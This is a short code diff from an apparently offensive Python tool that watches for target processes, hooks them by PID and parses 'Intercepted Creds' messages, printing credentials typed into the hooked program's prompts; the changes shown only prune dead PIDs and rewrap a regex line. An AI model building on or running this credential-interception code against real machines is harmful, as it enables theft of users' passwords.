@@ -41,8 +41,8 @@ def wait_for_process(process_name, tag_name, hook_function):
                 running_pids.append(process.pid)
                 print(f"[+] Found {tag_name} Window")
                 hook_function(process.pid)
-            # TODO: elif check if pids still alive -> if not then remove from running_pids
 
+        running_pids = list(filter(psutil.pid_exists, running_pids))
         sleep(0.5)
 
 
@@ -51,7 +51,8 @@ def on_credential_submit(message, data):
     print(message)
     if message['type'] == "send":
         credential_dump = message["payload"]
-        hooked_program = re.search(r"Intercepted Creds from (?P<hooked_program>[A-z]*)", credential_dump).groups("hooked_program")[0]
+        hooked_program = re.search(r"Intercepted Creds from (?P<hooked_program>[A-z]*)", credential_dump) \
+                                    .groups("hooked_program")[0]
 
         print(f"[+] Parsed credentials submitted to {hooked_program} prompt:")
         print(credential_dump)
